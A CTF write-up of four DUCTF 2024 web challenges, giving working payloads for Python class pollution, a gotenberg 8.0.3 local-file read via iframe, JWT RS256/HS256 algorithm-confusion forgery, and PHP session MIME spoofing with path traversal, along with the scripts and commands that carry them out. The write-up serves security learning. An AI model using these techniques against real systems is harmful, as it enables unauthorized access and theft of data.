## co2 [web]

A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

Author: n00b.master.

### Solution

Python challenge where we have a simple blog, it has the following endpoints:

- / : main endpoint, show public posts
- /register : allow us to register and saves the hash of the password in a database using SQLALCHEMY, if authenticated go to /dashboard (i)
- /login : allow us to login to the account we created, if authenticated go to /dashboard (i)
- /logout : to end the session, uses flask functions
- /profile : shows the user profile
- /dashboard: shows the user posts
- /blog/<blog_id>: get post by id (i)
- /edit/<blog_id>: This endpoint has a vulnerability because we can edit the post including the visibility of the post of other users, it just checks if the request is POST. Unfortunately there are no other posts previously created by users. (i)
- /create_post: creates a post and saves it to the database with the author being us (i)
- /changelog: shows information from previous fixes
- /get_flag: get us the flag if the variable flag is true but it is false and is not modified in the code so we can't change it, our only choice is to read the source code.
- /feedback: it has a form where we can fill our feedback
- /save_feedback: this method saves the feedback in a structure and calls a function called save_feedback_to_disk, **i think the entry is here**

Feedback is saved in a class feedback:

```py

# Not quite sure how many fields we want for this, lets just collect these bits now and increase them later. 
# Is it possible to dynamically add fields to this object based on the fields submitted by users?
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""
...

@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200
 
```

save_feedback_to_disk function:

```py

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def save_feedback_to_disk(feedback_obj):
    feedback = ""
    for attr in dir(feedback_obj):
        if not attr.startswith('__') and not callable(getattr(feedback_obj, attr)):
            feedback += f"{attr}: {getattr(feedback_obj, attr)}\n"
    feedback_dir = 'feedback'
    if not os.path.exists(feedback_dir):
        os.makedirs(feedback_dir)
        print(f"Directory {feedback_dir} created.")
    else:
        print(f"Directory {feedback_dir} already exists.")
    files = glob.glob(os.path.join(feedback_dir, '*'))
    if len(files) >= 5:
        oldest_file = min(files, key=os.path.getctime)
        os.remove(oldest_file)
        print(f"Deleted oldest file: {oldest_file}")
    new_file_name = os.path.join(feedback_dir, f"feedback_{int(time.time())}.txt")
    with open(new_file_name, 'w') as file:
        file.write(feedback)
    print(f"Saved feedback to {new_file_name}")
    return True

```

The function merge ovewrwrites the object attributes but allow us to overwrite other variables out of the scope of that object. FOr that we used prototype pollution. More information on here: [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/).

The final payload should be:

```json
{
    "title":"",
    "content":"",
    "rating":"",
    "referred":"",
   "__class__": {
        "__init__":{
            "__globals__":{
                "flag": "true"
            }
        }
  }
}
```

Then we can call the endpoint /get_flag and ge the flag.
Flag: `DUCTF{_cl455_p0lluti0n_ftw_}`

## hah got em [web]

    Deez nutz

    Hah got em

    ...

    Oh by the way I love using my new microservice parsing these arrest reports to PDF

The evil bot (2024)

Author: ghostccamm

### solution

FOr this challenge we only have the dockerfile. It writes the flag to /etc/flag.txt and uses a peculiar docker image: gotenberg/gotenberg:8.0.3
This image allow to convert url and html to pdfs uisng GO. Its uses the version 8.0.3 which is vulnerable to a critical flaw that allows to read filesystem files and is address in the next release: 8.1.0: https://github.com/gotenberg/gotenberg/releases/tag/v8.1.0

Doing a diff between the two releases we discover a test case:

[https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35R67](https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35R67)

We create a index.html with:

```
<html>

<body>
    <iframe src="/proc/self/root/etc/flag.txt"></iframe> <!--This payload also works-->
    <iframe src="\\localhost/etc/flag.txt"></iframe>
</body>

</html>
```

Then we can send the file using curl like: `curl -X POST -F 'files=@index.html' -o sol.pdf http://localhost:1337/forms/chromium/convert/html`

## i am confusion [web]

The evil hex bug has taken over our administrative interface of our application. It seems that the secret we used to protect our authentication was very easy to guess. We need to get it back!

Author: richighimi

### Solution

Basically we have javascript application that has the following endpoints:

- /: which redirects to login.html
- /logon: which accepts username and password and verifies if username is admin:

```js
if (/^admin$/i.test(username)) {
    res.status(400).send("Username taken");
    return;
  }
```

If not it will create a JWT token using a private key and public key with the algorithm RS256 and redirect to public.html.

```js
app.post('/login', (req,res) => {
  var username = req.body.username
  var password = req.body.password

  if (/^admin$/i.test(username)) {
    res.status(400).send("Username taken");
    return;
  }

  if (username && password){
    var payload = { user: username };
    var cookie_expiry =  { maxAge: 900000, httpOnly: true }

    const jwt_token = jwt.sign(payload, privateKey, signAlg)

    res.cookie('auth', jwt_token, cookie_expiry)
    res.redirect(302, '/public.html')
  } else {
    res.status(404).send("404 uh oh")
  }
});
```

- /public.html: it will verify the token with a list of algorithms: `const verifyAlg = { algorithms: ['HS256','RS256'] }`, if we dont get errors the page is loaded otherwise it goes to login:

```js
app.get('/public.html', (req, res) => {
  var cookie = req.cookies;
  jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
    if (err) {
      res.status(302).redirect('/login.html');
    } else if (decoded_jwt['user']) {
      res.sendFile(path.join(__dirname, 'public.html'))
    }
  })
})
```

If we modify the jwt token and change the username to admin we get the flag once we access the admin.html:

```js
app.get('/admin.html', (req, res) => {
  var cookie = req.cookies;
  jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
    if (err) {
      res.status(403).send("403 -.-");
    } else if (decoded_jwt['user'] == 'admin') {
      res.sendFile(path.join(__dirname, 'admin.html')) // flag!
    } else {
      res.status(403).sendFile(path.join(__dirname, '/public/hehe.html'))
    }
  })
})
```

The server is using both algorithms to verify the jwt token but this introduces a vulnerability because it is using the public key as the key to verify the symmetric algorithm, if we can access the public key we can sign jwt tokens and modify them.

And the server uses HTTPS using the keys it uses to sign the tokens so we can extract the public key from it and then use it to sign tokens. Commands bellow:

- Get certificate: `openssl s_client -connect 172.25.80.1:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem`
- Convert the certificate to x509 `openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem`
- Convert the public key to be in RSA format `openssl rsa -inform PEM -in pubkey.pem -pubin -RSAPublicKey_out -outform PEM > pubkey.rsa`
- Use node cli to sign JWT with the algorithm as HS256 and sign with the x509 public key:

```js
node const jwt = require('jsonwebtoken') var fs = require('fs') var pub = fs.readFileSync('pubkey.rsa'); token = jwt.sign({ 'user': 'admin' }, pub, { algorithm:'HS256' }); 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjAzMzE2MzJ9.5pQCXHaYlVjVxXRpt58kBy_kQi94RBqRDeeqWlZh05g'
```

## sniffy [web]

Visit our sanctuary to hear the sounds of the Kookaburras!

Author: hashkitten

### Solution

Sniffy its a PHP application that allow us to hear sounds.
The flag is in the flag.php and can be read in the session: `$_SESSION['flag'] = FLAG; /* Flag is in the session here! */`

We can change the theme of the page by passing a parameter theme but we cant  inject since it will be only light or dark:

```php
function other_theme() {
    return $_SESSION['theme'] == "dark" ? "light" : "dark";
}

$_SESSION['theme'] = $_GET['theme'] ?? $_SESSION['theme'] ?? 'light';

```

When we select a sound in the main page it uses a javascript function that makes a request to audio.php and gets the parameter "f": `playAudio('/audio.php?f=$v')`

```js
function playAudio(url) {
  new Audio(url).play();
}
```

The audio.php takes the value from the parameter "f" and checks its mime type:

```php
<?php

$file = 'audio/' . $_GET['f'];

if (!file_exists($file)) {
	http_response_code(404); die;
}

$mime = mime_content_type($file);

if (!$mime || !str_starts_with($mime, 'audio')) {
	http_response_code(403); die;
}

header("Content-Type: $mime");
readfile($file);
```

Since we can do a path transversal and we can write the session variable "theme" we can do a MIME spoofing by injecting in various locations the magic bytes(We can see the php function that is used to check for the magic bytes [https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime)) and try to look at the session file until we get a file with mime type that starts with audio, bellow is the script to do it:

```py
import requests
import urllib.parse

target = 'https://web-sniffy-d9920bbcf9df.2024.ductf.dev'
s = requests.Session()

# excerpt from php / magic.mime
'''
#audio/x-fasttracker-module
#>0 string  >\0     Title: "%s"
1080    string  8CHN        audio/x-mod
'''
for i in range(980, 1000):
    r = i*b'A' + b"8CHN"
    d = s.get(f"{target}/?theme[0]={urllib.parse.quote(r)}")
    d = s.get(f"{target}/audio.php?f=../../../../tmp/sess_{s.cookies.get('PHPSESSID')}")
    if d.status_code != 403:
        print(d.status_code, d.text)
        break
```

Other script:

```py
import requests

cookies = {
	'PHPSESSID': 'abcd'
}

for i in range(4):
	r = requests.get('http://localhost:8080/', params={'theme': 'a' * i + 'M.K.' * 300}, cookies=cookies)
	r = requests.get('http://localhost:8080/audio.php', params={'f': '../../../../tmp/sess_abcd'})
	if r.status_code != 403:
		print('found')
		print(r.text)

```


Flag: `993 200 flag|s:52:"DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}";theme|a:1:{i:0;s:997:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8CHN";}`
